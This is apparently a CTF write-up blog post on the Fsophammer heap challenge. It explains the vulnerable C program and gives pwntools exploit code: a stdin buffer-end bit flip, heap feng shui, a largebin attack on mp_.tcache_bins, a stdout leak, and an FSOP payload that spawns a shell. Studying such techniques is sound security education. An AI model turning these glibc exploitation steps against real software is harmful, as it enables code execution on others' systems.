+++
date = '2026-04-22T17:13:34+08:00'
draft = false
title = 'Fsophammer and fengshui'
categories = ["writeup"]
tags = ["heap", "pwn"]
+++

#### Introduction: 

Finally back on pwn grind and chose to tick off Fsophammer which has been on my backlog for a long long time. I had help for 80% of the challenge but I learnt a lot and would like to remember what I learnt so here is my writeup.

#### Table of Contents:

1. Source code review
1. Attack plan and thought process.
1. Exploitation

#### Source code review:

```C
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

#define N_ENTRIES 4
#define MAX_SZ 0x3000

const char banner[] = "\n\n"
"  _________.____       _____      _____            .____   ._.   ____.\n"
" /   _____/|    |     /  _  \\    /     \\           |   _|  | |  |_   |\n"
" \\_____  \\ |    |    /  /_\\  \\  /  \\ /  \\          |  |    |_|    |  |\n"
" /        \\|    |___/    |    \\/    Y    \\         |  |    |-|    |  |\n"
"/_______  /|_______ \\____|__  /\\____|__  /         |  |_   | |   _|  |\n"
"        \\/         \\/       \\/         \\/          |____|  |_|  |____|\n"
"    ______________ ______________                          ._.        \n"
"    \\__    ___/   |   \\_   _____/                          | |        \n"
"      |    | /    ~    \\    __)_                           |_|        \n"
"      |    | \\    Y    /        \\                          |-|        \n"
"      |____|  \\___|_  /_______  /                          | |        \n"
"                    \\/        \\/                           |_|        \n\n";
char* entries [N_ENTRIES];
int slammed = 0;

void init_setup(void) __attribute__ ((constructor));
void alloc();
void free();
void slam();

void init_setup() {
  setbuf(stdout,NULL);
  setbuf(stderr,NULL);
}

int get_num(const char* prompt, size_t* num, size_t bound) {
  printf("%s> ", prompt);
  int scanned = scanf("%zu",num);
  getchar();
  if((scanned != 1) || (bound && *num >= bound)) {
    puts("[-] getnum");
    return -1;
  }
  return 0;
}

void get_str(char* buf, size_t cap) {
  char c;
  printf("content> ");
  // I'm so nice that you won't have to deal with null bytes
  for (int i = 0 ; i < cap ; ++i) {
    int scanned = scanf("%c",&c);
    if (scanned !=1 || c=='\n') {
      return;
    }
    buf[i] = c;
  }
}
```
```
```

These are the set up and general use functions. You may notice that `stdin` is buffered and that `get_str()` makes it so that I do not have to deal with null bytes (Thank god).

```c
void alloc() {
  size_t idx;
  size_t sz;
  if(get_num("index",&idx,N_ENTRIES)) {
    return;
  }
  if(get_num("size",&sz,MAX_SZ)) {
    return;
  }
  entries[idx] = malloc(sz);
  get_str(entries[idx],sz);
  printf("alloc at index: %zu\n", idx);
}
```

Just a regular allocation function, with a write-on-alloc.

```c
void free_() {
  size_t idx;
  if(get_num("index",&idx,N_ENTRIES)) {
    return;
  }
  if(!entries[idx]) {
    return;
  }
  free(entries[idx]);
  entries[idx] = NULL;
}
```

Also a regular and safe free function.

```c
void slam() {
  size_t idx;
  size_t pos;
  puts("is this rowhammer? is this a cosmic ray?");
  puts("whatever, that's all you'll get!");
  if (get_num("index",&idx,sizeof(*stdin))) {
    return;
  }

  if (idx < 64) {
    puts("[-] invalid index");
    return;
  }

  if (get_num("pos",&pos,8)) {
    return;
  }
  unsigned char byte = ((char*)stdin)[idx];
  unsigned char mask = ((1<<8)-1) & ~(1<<pos);
  byte = (byte & mask) | (~byte & (~mask));
  ((char*)stdin)[idx] = byte;
}
```
```
```

A very interesting function. This function changes a bit of a byte to 0 at any index in `stdin` struct greater than 64. Hmmmmmmm very interesting.

```c
void menu() {
  puts("1. alloc\n2. free\n3. slam");
  size_t cmd;

  if (get_num("cmd",&cmd, 0)) {
    return;
  }

  switch(cmd) {
    case 1:
      alloc();
      break;
    case 2:
      free_();
      break;
    case 3:
      if (!slammed) {
        slam();
        slammed = 1;
      } else {
        puts("[-] slammed already");
      }
      break;
    default:
      puts("[-] invalid cmd");
      break;
  }
}

int main() {
  puts(banner);
  while(1) {
    menu();
  }
  return 0;
}
```

Finally just the main logic of the program.

So looking at this you may go what the hell?? Theres not a single thing here thats dangerous, you have a write-on-alloc and a free where the pointer gets nulled too so no UAF. There is no overflow as well... Or is there??? (vsauce theme plays).

Since `stdin` is buffered, there is actually a 0x1000 size chunk allocated on the heap for the buffer, where user input will be buffered before being sent to the actual destination.


![stdinonheap](/post/fsophammer/images/stdinonheap.jpeg)

Looking at `slam()` we can use it to change one of `stdin` pointers and looking at the struct, _IO_buf_end pointer will be our target since if buf_end - buf_base > 0x1000 we will get an overflow, so there is our primitive. (`stdin` will think that buf_end is actually further away and continue reading past the actual end of the buffer past into the next chunk.)

![stdinstruct](/post/fsophammer/images/stdinstruct.jpeg)

#### Attack plan and thought process.

Now that we have our primitive, what is next? We have no leaks since the program only has an alloc and free function, limiting our options greatly. No tcache poisoning, no unsafe unlink, we also need to touch something that has no mangled pointers. With the wise words of my sensei, the heap is a sandbox and we want to escape it. Without leaks we can only rely on partial overwrites and the heap offers libc pointers from unsorted bin so we can use those pointers for a partial overwrite but where do I overwrite to and how do I overwrite?

With these restrictions, only the largebin attack is feasible since I just need control over `bk_nextsize` of a largebin chunk. Since we now have the attack surface of the entire libc, I need to find something to overwrite with a large value. 

**GIGA LORE DROP TIME** This structure that lives in libc is perfect (bestowed to me by sensei)

The [malloc_par struct can be accessed globally by mp_](https://4xura.com/binex/pwn-mp_-exploiting-malloc_par-to-gain-tcache-bin-control/)(please read this for more information) has a field called `tcache_bins` which control how many tcache bins there are. When overwritten with a large value (like a heap address in largebin attack) we can trick the allocator into thinking larger sized chunks like (0x500) belong in the tcache.

Next, when `mp_.tcache_bins` is corrupted with a large value, it also affects the `tcache_perthread_struct` as well causing you to be able to have OOB access of the struct into other chunks since the pointers stored in `tcache_perthread_struct` are unmangled we can use it to get our arbitrary allocation.

### Plan

So our plan boils down to

1. Largebin attack to overwrite `mp_.tcache_bins` with a large value
1. Somehow get `stdout` pointers in chunks to get an actual libc leak and lead to FSOP.

Wow this sounds really simple, surely nothing can go wrong (foreshadowing).

#### Largebin Attack

[Largebin attack on how2heap](https://github.com/shellphish/how2heap/blob/master/glibc_2.39/large_bin_attack.c)

```c
	if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk)){
		fwd = bck;
		bck = bck->bk;
		victim->fd_nextsize = fwd->fd;
		victim->bk_nextsize = fwd->fd->bk_nextsize;
		fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
	}
```

When a new smaller chunk is inserted into largebin, it goes through this logic.

```c
victim->bk_nextsize->fd_nextsize = victim;
```

Making use of this write, if we control the `bk_nextsize` of victim, we are able to write the address of victim to any address we desire.

#### Exploitation:

So now we can begin exploitation, following instructions from how2heap, we allocate a 0x428 chunk (p1) and a guard chunk then a 0x418 chunk (p2) and a guard chunk. Free p1 and then allocate a chunk larger than p1 to get it placed into largebin.

Next, we free p2 and now we have p2 in the unsorted bin and p1 in the largebin and we just have to overwrite the `bk_nextsize` of p1.

![largebinwithnolibc](/post/fsophammer/images/largebinwithnolibc.jpg)

Oh wtf?? and here we see the next big problem of the challenge (which I could not figure out). We have no leaks or anything so to be able to partial overwrite a libc pointer, I need a libc pointer there but instead its a heap pointer oh no man

### Fengshui

So how do we get a libc pointer in that position? We can overlap the chunk with an unsorted bin chunk such that the unsorted bin chunk's fd and bk which point into libc is where `bk_nextsize` is for the largebin chunk.

First we allocate a victim chunk we will overflow. Then another chunk with a fake chunk and padding inside it. 

Next, we allocate the second chunk involved in largebin attack. Then we call slam to gain our overwrite.

```python
alloc(0, 0x420, b"") #victim chunk
fakechunk = b"A"*0x60 + p64(0) + p64(0x3c0+0x20|1)
alloc(1, 0x428, fakechunk) #p1
alloc(3, 0x10, b"")#guard chunk
alloc(2, 0x418, b"")#p2
alloc(3, 0x10, b"")#guard chunk
slam(64, 6)
```

After slamming we can perform our overwrite such that the victim chunk size is where the fake chunk starts.

```python
p.sendline(p16(0x3)*(0x1000//0x2)+p64(0x0)+p64(0x501-0x60))
```

You may notice that theres a bunch of `p16(0x3)` being written as well and that is because we are using our extended `tcache_perthread_struct` to get our arbitrary allocation later and this requires that `counts[idx] > 0` so that the allocator thinks that there are actually chunks inside that tcache bin.

Now we free p1 and put it into largebin.

```python
free(1) #p1
alloc(3, 0x500, b"") #just to put p1 into largebin
```

Now we free victim chunk, since we overwrote the size of victim chunk, allocator thinks that its a larger size that it is and puts it into the unsorted bin and now we have our overlap since victim chunk overlaps with p1.

We also allocate just enough such that when unsorted bin puts the fd and bk of the remainder chunk it lands at the same place as where `bk_nextsize` is for p1. This fengshui is so beautiful.

```python
free(0) #free victim chunk with corrupted size
alloc(1, 0x430, b"") #remainder the chunk in unsorted bin
```

![corruptedlargebin](/post/fsophammer/images/corruptedlargebin.jpg)

Now that we have libc pointers where we need them, we can allocate a chunk to partial overwrite. Once again, we need to change `bk_nextsize` of p1 to target-0x20 and also get 2 pointers to `stdout` into the heap as well.

```python
mp = 0x203180
target = 0x2031c8 #mp_.tcachebins-0x20
stdout = 0x00000000002045c0
alloc(3, 0xa, b"B"*8 + b"\xc8\x31") #overwrites fd_nextsize and bk_nextsize of p1
alloc(3, 0x2, b"\xc0\x45") #overwrites the residual libc pointer from the remaindered chunk in unsorted with stdout
free(1)
alloc(1, 0x430, b"\xc0\x45")
#also overwriting residual libc pointers from chunks from unsorted with stdout
```

Finally we can free p2 into largebin and cause the write to happen.

```python
free(2)
alloc(3, 0x450, b"")
```

![mpoverwrite](/post/fsophammer/images/mpoverwrite.jpg)

Now that `mp_.tcache_bins` is a large value, basically the entire heap is our `tcache_perthread_struct` so we can look at the address of the `stdout` pointers we sprayed and do some math.

We need to find the index that this "chunk" belongs to first.

**idx = (address of stdout pointer - entries base in perthread)/8**

Now that we have the index we can find the size of the chunk we need to request to gain an allocation to `stdout`.

**size = 0x20 + (idx \*0x10)**

Using this as an example,

![mathexample](/post/fsophammer/images/mathexample.jpg)

Heap base is **0x55fcdd51c000** and the address that is holding my stdout pointer is **0x55fcdd51d710**.

0x90 is the offset from the base to where the `entries` array starts in `tcache_perthread_struct`.

idx = (**0x55fcdd51d710** - (**0x55fcdd51c000 + 0x90**))/8 = 0x2d0

size = **0x20 + (0x2d0 \*0x10) = 0x2d20**

Now we have full control over `stdout`, we must first use it to get leaks before I can do any FSOP, so we just use the standard stdout leak payload from [nobodyisnobody](https://github.com/nobodyisnobody/docs/tree/main/using.stdout.as.a.read.primitive/).
```python
readpayload = p64(0xfbad1887) + p64(0)*3 + p8(0)
alloc(0, 0x2d20-8, readpayload) # must -8 so that the chunk is actually 0x2d20 size since the calculation accounts for metadata too
leak = p.recvline()[:8]
leak = u64(leak.ljust(8, b"\x00"))
leak = leak - 0x204644
print(hex(leak))
```

Once we get our leaks we allocate once again to get the other `stdout` pointer we sprayed in the heap, using the same formula to calculate size.

```python
stdout = leak + stdout
system = leak + 0x0000000000058740
io_wfile_jumps = leak + 0x0000000000202228
fs = FileStructure()
fs.flags = u64("  " + "sh".ljust(6, "\x00"))
fs._IO_write_base = 0
fs._IO_write_ptr = 1
fs._lock = stdout-0x10
fs.chain = system
fs._codecvt = stdout
fs._wide_data = stdout - 0x48
fs.vtable = io_wfile_jumps
alloc(1, 0x2460-8, bytes(fs))
```

Once we have leaks we can just use a standard FSOP payload too.

![win](/post/fsophammer/images/win.jpg)

#### Conclusion:

Kinda sad that I didnt solve this alone but this was a tough challenge and I still learnt a lot even with so much help and I hope beginners can also understand whats happening. If I made a mistake please come curse and swear at me.

#### References:
[My solve script](https://github.com/Waheyy/challenges/tree/main/fsophammer)


[Blog for mp_](https://4xura.com/binex/pwn-mp_-exploiting-malloc_par-to-gain-tcache-bin-control/#toc-head-9)

[Blog for largebin write](https://4xura.com/binex/heap/large-bin-attack/)

[Another write up I referenced](https://rwandi-ctf.github.io/LakeCTF2024/fsophammer/)

[Alternative method by samuzora](https://samuzora.com/posts/lakectf-24-fsophammer)


